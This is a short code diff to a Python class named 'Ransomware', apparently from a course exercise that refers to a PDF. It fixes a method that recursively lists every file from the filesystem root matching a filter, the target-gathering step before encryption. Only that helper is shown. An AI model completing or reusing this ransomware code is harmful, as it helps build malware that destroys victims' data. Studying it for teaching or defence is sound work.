@@ -53,10 +53,11 @@ class Ransomware:
             sys.exit(1)
 
     def get_files(self, filter:str)->list:
-        # get all files in the root directory
-        path = Path("/")
         # return all files matching the filter
-        raise [str(file) for file in path.glob(filter)]
+        path = Path("/")
+        matching_files = list(path.rglob(filter)) #récupère tous les fichiers correspondant au filtre
+        return [str(file) for file in matching_files] #retourne la liste des fichiers en string
+        
 
     def encrypt(self):
         # main function for encrypting (see PDF)
